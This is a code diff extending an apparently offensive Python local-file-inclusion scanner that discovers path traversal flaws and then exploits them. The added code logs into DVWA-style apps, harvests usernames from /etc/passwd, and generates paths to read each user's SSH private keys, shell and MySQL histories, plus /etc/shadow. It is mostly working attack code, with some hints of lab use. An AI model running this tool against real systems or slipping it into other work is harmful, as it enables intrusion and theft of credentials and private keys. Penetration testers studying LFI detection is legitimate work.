@@ -15,13 +15,18 @@ from requests.packages.urllib3.util.retry import Retry
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class LFIScanner:
-    def __init__(self, proxy=None, threads=10):
+    def __init__(self, proxy=None, threads=10, wordlist=None, username=None, password=None, cookies=None):
         """Initialize scanner with configuration
         - proxy: Set up proxy for traffic inspection
         - threads: Control parallel request count
         - payloads: List of path traversal test patterns
         - vulnerabilities: Store found vulnerabilities
         - exploit_files: Target files for post-discovery exploitation"""
+        self.auth_credentials = (username, password)
+        self.login_url = "http://localhost/login.php"
+        self.unique_vulns = set()
+        self.unique_entries = set()
+        self.cookies = cookies
         self.session = self._create_session(proxy)  
         self.tested_combinations = set()
         self.visited_urls = set()
@@ -34,6 +39,94 @@ class LFIScanner:
         self.exploit_files = [  # Target files for exploitation phase
             '/etc/passwd', '/etc/shadow', '/etc/hosts', # ... full list
         ]
+        if wordlist:
+            self._load_wordlist(wordlist)
+        self.user_file_patterns = [
+            '.bash_history',
+            '.ssh/id_rsa',
+            '.ssh/authorized_keys',
+            '.mysql_history',
+            # ... full list from user input
+        ]
+    def _load_wordlist(self, wordlist_path):
+        """Load custom file paths for exploitation"""
+        try:
+            with open(wordlist_path) as f:
+                custom_files = [
+                    line.strip() 
+                    for line in f 
+                    if line.strip() and not line.startswith('#')
+                ]
+                # Normalize paths and ensure absolute format
+                normalized = [
+                    f'/{path.lstrip("/")}' if not path.startswith('/') else path
+                    for path in custom_files
+                ]
+                self.exploit_files.extend(normalized)
+                # Remove duplicates while preserving order
+                seen = set()
+                self.exploit_files = [
+                    x for x in self.exploit_files 
+                    if not (x in seen or seen.add(x))
+                ]
+        except Exception as e:
+            print(f"[!] Wordlist error: {str(e)}")
+            sys.exit(1)
+            
+    def _add_entry(self, entry):
+        """Universal deduplication for all result types"""
+        entry_hash = hash(frozenset({
+            'url': entry.get('url'),
+            'parameter': entry.get('parameter'),
+            'payload': unquote(entry.get('payload', '')),
+            'target_file': entry.get('target_file', ''),
+            'type': entry.get('type', 'discovery')
+        }.items()))
+
+        if entry_hash not in self.unique_entries:
+            self.unique_entries.add(entry_hash)
+            if entry.get('type') == 'exploitation':
+                self.exploitation_results.append(entry)
+            else:
+                self.vulnerabilities.append(entry)
+
+
+    def _add_vulnerability(self, entry):
+        """Deduplicate entries using a unique hash"""
+        vuln_hash = hash(frozenset({
+            'url': entry['url'],
+            'parameter': entry['parameter'],
+            'payload': unquote(entry['payload']),
+            'target_file': entry.get('target_file', '')
+        }.items()))
+        
+        if vuln_hash not in self.unique_vulns:
+            self.unique_vulns.add(vuln_hash)
+            self.vulnerabilities.append(entry)
+
+    def _authenticate(self):
+        """Handle DVWA-style authentication"""
+        login_data = {
+            'username': self.auth_credentials[0],
+            'password': self.auth_credentials[1],
+            'Login': 'Login'
+        }
+        
+        # Get CSRF token
+        response = self.session.get(self.login_url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        csrf_token = soup.find('input', {'name': 'user_token'}).get('value')
+        
+        # Add CSRF token to login data
+        login_data['user_token'] = csrf_token
+        
+        # Post login request
+        response = self.session.post(self.login_url, data=login_data)
+        
+        # Verify login success
+        if "Login failed" in response.text:
+            raise Exception("Authentication failed")
+        
 
     def _create_session(self, proxy):
         """Configure HTTP session with retries and headers
@@ -48,10 +141,24 @@ class LFIScanner:
         session.mount('https://', HTTPAdapter(max_retries=retries))
         session.mount('http://', HTTPAdapter(max_retries=retries))
         # Set headers to mimic regular browser traffic
+
         session.headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-            'Accept-Language': 'en-US,en;q=0.5'
+            'Accept-Language': 'en-US,en;q=0.5',
         }
+        # # Temporary hardcoded cookies (remove after testing)
+        # session.headers['Cookie'] = 'PHPSESSID=4st6e8jg91sskb0tu3eoot9ir5; security=low'    
+            
+
+         # Add custom cookies if provided
+        if self.cookies:
+            cookie_dict = {}
+            for cookie in self.cookies.split(';'):
+                if '=' in cookie:
+                    name, value = cookie.strip().split('=', 1)
+                    cookie_dict[name] = value
+            session.headers['Cookie'] = '; '.join([f'{k}={v}' for k,v in cookie_dict.items()])
+
         if proxy:  # Proxy configuration
             if not proxy.startswith(('http://', 'https://')):
                 proxy = f'http://{proxy}'
@@ -102,22 +209,24 @@ class LFIScanner:
         1. Set base domain for same-domain crawling
         2. Start URL crawling and parameter discovery
         3. Launch exploitation phase after initial scan"""
+        if self.auth_credentials[0]:
+            self._authenticate()
         self.base_domain = urlparse(start_url).netloc
         self._crawl(start_url)
         self._exploit_vulnerabilities()
         return self.vulnerabilities + self.exploitation_results
 
     def _exploit_vulnerabilities(self):
+        """Launch exploitation phase after initial scan with deduplication"""
         """Post-discovery exploitation phase
         - Uses found vulnerabilities to test additional files
         - Threaded execution for speed
         - Tests each vulnerable parameter against all target files"""
         if not self.vulnerabilities:
             return
-            
+
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
             futures = []
-            # Generate exploitation tests for each found vulnerability
             for vuln in self.vulnerabilities:
                 for target_file in self.exploit_files:
                     futures.append(executor.submit(
@@ -125,10 +234,11 @@ class LFIScanner:
                         vuln['url'], vuln['parameter'], 
                         vuln['payload'], target_file
                     ))
-            # Process results as they complete
+
             for future in as_completed(futures):
                 if result := future.result():
                     self.exploitation_results.append(result)
+
 
     def _test_exploit(self, original_url, param, base_payload, target_file):
         """Test specific file exploitation
@@ -146,8 +256,8 @@ class LFIScanner:
             )).geturl()
 
             response = self.session.get(test_url, timeout=15)
-            if self._is_valid_exploitation(response):
-                return {
+            if result := self._is_valid_exploitation(response):
+                result_entry = {
                     'type': 'exploitation',
                     'url': test_url,
                     'parameter': param,
@@ -158,6 +268,8 @@ class LFIScanner:
                     'length': len(response.text),
                     'timestamp': datetime.now().isoformat()
                 }
+                self._add_entry(result_entry) 
+                return result_entry
         except Exception as e:
             print(f"[-] Exploit failed: {str(e)}")
         return None
@@ -193,40 +305,17 @@ class LFIScanner:
         """
         # Decode payload to handle URL encoding
         decoded_payload = unquote(base_payload)
+    
+        # Normalize target file path
+        target_path = target_file.lstrip('/')
 
-        # Prepare target path (remove leading slash to prevent path issues)
-        stripped_target = target_file.lstrip('/')
+        # Replace both possible patterns
+        modified = decoded_payload.replace('etc/passwd', target_path)
+        modified = modified.replace('/etc/passwd', target_path)
 
-        # Perform direct replacement in decoded payload
-        modified_payload = decoded_payload.replace('etc/passwd', stripped_target)
+        # Preserve original encoding and structure
+        return quote(modified)
 
-        # Re-encode while preserving all components (including null bytes)
-        return quote(modified_payload)
-
-
-        # # Detect encoding depth by successive decoding
-        # encoding_depth = 0
-        # current_payload = base_payload
-        # while True:
-        #     decoded = unquote(current_payload)
-        #     if decoded == current_payload:  # No more encoding layers
-        #         break
-        #     encoding_depth += 1
-        #     current_payload = decoded
-
-        # # Replace target file in fully decoded payload
-        # stripped_target = target_file.lstrip('/')
-        # modified = current_payload.replace('etc/passwd', stripped_target)
-
-        # # Remove null bytes from original pattern
-        # modified = modified.replace('\x00', '').replace('%00', '')
-
-        # # Re-apply equivalent encoding layers
-        # encoded_payload = modified
-        # for _ in range(encoding_depth):
-        #     encoded_payload = quote(encoded_payload)
-
-        # return encoded_payload
 
     def _extract_target_file(self, base_payload):
         """Identify reusable traversal pattern
@@ -383,7 +472,7 @@ class LFIScanner:
             response = self.session.get(test_url, timeout=15)
             
             if self._is_vulnerable(response):
-                return {
+                result = {
                     'url': test_url,
                     'parameter': param,
                     'payload': payload,
@@ -392,6 +481,8 @@ class LFIScanner:
                     'length': len(response.text),
                     'timestamp': datetime.now().isoformat()
                 }
+                self._add_entry(result)  
+                return result
 
         except Exception as e:
             print(f"[-] Test failed: {str(e)}")
@@ -456,6 +547,42 @@ class LFIScanner:
             print(f"[-] Baseline error: {str(e)}")
             return None
         
+    def _extract_users_from_passwd(self, passwd_content):
+        """Parse /etc/passwd to extract valid usernames"""
+        users = []
+        for line in passwd_content.split('\n'):
+            if line.strip() and not line.startswith('#'):
+                parts = line.split(':')
+                if len(parts) > 5:
+                    username = parts[0]
+                    home_dir = parts[5]
+                    if home_dir.startswith('/home/'):
+                        users.append({
+                            'name': username,
+                            'home': home_dir
+                        })
+        return users
+    
+    def _process_exploitation_results(self, result):
+        """Handle special case for /etc/passwd to extract users"""
+        if result['target_file'] == '/etc/passwd' and result['status'] == 200:
+            users = self._extract_users_from_passwd(result['content'])
+            self._generate_user_files(users)
+
+        self.exploitation_results.append(result)
+
+    def _generate_user_files(self, users):
+        """Generate user-specific file paths for further exploitation"""
+        for user in users:
+            for pattern in self.user_file_patterns:
+                # Convert ~/path to /home/username/path
+                clean_path = pattern.replace('~/', '')
+                user_path = f"{user['home']}/{clean_path}"
+                if user_path not in self.exploit_files:
+                    self.exploit_files.append(user_path)
+
+        
+        
 def main():
     """Command-line interface and main execution flow
     1. Parse command-line arguments
@@ -469,70 +596,98 @@ def main():
         description="Advanced LFI Scanner - Detect and exploit path traversal vulnerabilities",
         epilog="Example: %(prog)s -u https://example.com -p 127.0.0.1:8080 -t 20 -o json"
     )
-    
+    group = parser.add_mutually_exclusive_group(required=True)
+
     # Define supported command-line arguments
-    parser.add_argument("-u", "--url", required=True,
-                      help="Target URL to scan (e.g., https://vulnerable-site.com)")
+    group.add_argument("-u", "--url", help="Single target URL")
+    group.add_argument("-l", "--url-list", help="File containing list of URLs to test")
+
+    parser.add_argument("-w", "--wordlist", 
+                  help="Custom file path wordlist for exploitation")
     parser.add_argument("-p", "--proxy", 
                       help="Proxy server for traffic inspection (e.g., Burp Suite: 127.0.0.1:8080)")
     parser.add_argument("-o", "--output", choices=['json', 'csv'], 
                       help="Generate report in specified format (JSON/CSV)")
     parser.add_argument("-t", "--threads", type=int, default=10,
                       help="Concurrent threads for scanning (default: 10, max recommended: 50)")
-
+    parser.add_argument("--auth-url", help="Login page URL")
+    parser.add_argument("-U", "--username", help="Authentication username")
+    parser.add_argument("-P", "--password", help="Authentication password")
+    parser.add_argument("--cookies", 
+                  help="Session cookies in 'name1=value1; name2=value2' format")
     # Parse user input
     args = parser.parse_args()
+
+    # Validate input arguments
+    if not args.url and not args.url_list:
+        print("[-] Must specify either --url or --url-list")
+        return
     
     # Initialize scanner with user configuration
     scanner = LFIScanner(
         proxy=args.proxy, 
-        threads=args.threads
+        threads=args.threads,
+        wordlist=args.wordlist  # Pass wordlist to scanner
     )
-    
-    print(f"[*] Starting scan on {args.url} with {args.threads} threads")
-    
+
+    # Process target URLs
+    all_results = []
     try:
-        # Execute full scanning process
-        vulnerabilities = scanner.scan(args.url)
-        
-        # Report generation logic
+        if args.url:
+            start_urls = [args.url]
+            print(f"[*] Starting scan on {args.url} with {args.threads} threads")
+        else:
+            with open(args.url_list) as f:
+                start_urls = [line.strip() for line in f if line.strip()]
+            print(f"[*] Starting scan on {len(start_urls)} URLs from {args.url_list} with {args.threads} threads")
+
+        for index, url in enumerate(start_urls, 1):
+            # Validate URL format
+            parsed = urlparse(url)
+            if not parsed.scheme or not parsed.netloc:
+                print(f"\n[-] Skipping invalid URL (#{index}): {url}")
+                continue
+            
+            print(f"\n[+] Scanning URL #{index}: {url}")
+            try:
+                results = scanner.scan(url)
+                all_results.extend(results)
+            except Exception as e:
+                print(f"[-] Error scanning {url}: {str(e)}")
+            finally:
+                # Reset scanner state for next URL
+                scanner.visited_urls = set()
+                scanner.tested_combinations = set()
+                scanner.vulnerabilities = []
+                scanner.exploitation_results = []
+                scanner.base_domain = None
+        # Generate report after all scans
         if args.output:
+            output_file = f"report.{args.output.lower()}"
             if args.output.lower() == 'json':
-                # Generate JSON report with pretty printing
-                with open('report.json', 'w') as f:
-                    json.dump(vulnerabilities, f, indent=2, ensure_ascii=False)
-                print("[*] JSON report generated: report.json")
-                
+                with open(output_file, 'w') as f:
+                    json.dump(all_results, f, indent=2)
             elif args.output.lower() == 'csv':
-                # Generate CSV report with standard columns
-                with open('report.csv', 'w', newline='') as f:
+                with open(output_file, 'w', newline='') as f:
                     writer = csv.writer(f)
-                    # Write header row
-                    writer.writerow([
-                        'URL', 'Parameter', 'Payload', 
-                        'Status', 'Length', 'Timestamp'
-                    ])
-                    # Write vulnerability data
-                    for vuln in vulnerabilities:
+                    writer.writerow(['URL', 'Parameter', 'Payload', 'Status', 
+                                    'Length', 'Timestamp'])
+                    for vuln in all_results:
                         writer.writerow([
-                            vuln['url'],
-                            vuln['parameter'],
-                            vuln['payload'],
-                            vuln['status'],
-                            vuln['length'],
-                            vuln['timestamp']
+                            vuln.get('url'),
+                            vuln.get('parameter'),
+                            vuln.get('payload'),
+                            vuln.get('status'),
+                            vuln.get('length'),
+                            vuln.get('timestamp')
                         ])
-                print("[*] CSV report generated: report.csv")
-        
-        # Final status output
-        print(f"[*] Scan complete. Found {len(vulnerabilities)} vulnerabilities.")
-    
-    except KeyboardInterrupt:
-        print("\n[!] Scan interrupted by user")
+            print(f"\n[*] Report saved to {output_file}")
+
+        print(f"\n[*] Scan complete. Found {len(all_results)} vulnerabilities across {len(start_urls)} URLs")
+
     except Exception as e:
-        # Handle unexpected errors gracefully
         print(f"[!] Critical error: {str(e)}")
-        print("[!] Consider reducing thread count or checking network connection")
+        sys.exit(1)
 
 
 if __name__ == "__main__":
